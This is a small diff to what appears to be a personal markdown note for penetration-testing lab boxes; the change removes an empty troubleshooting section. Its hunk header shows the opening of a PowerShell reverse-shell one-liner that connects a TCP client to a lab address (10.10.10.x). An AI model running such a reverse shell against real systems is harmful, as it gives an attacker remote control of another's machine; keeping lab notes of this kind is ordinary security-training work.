@@ -54,8 +54,5 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ## Boxes where I used this
 - [[]]
 
-## Gotchas / troubleshooting
-- Things that broke and how you fixed them:
-
 ## References
 -
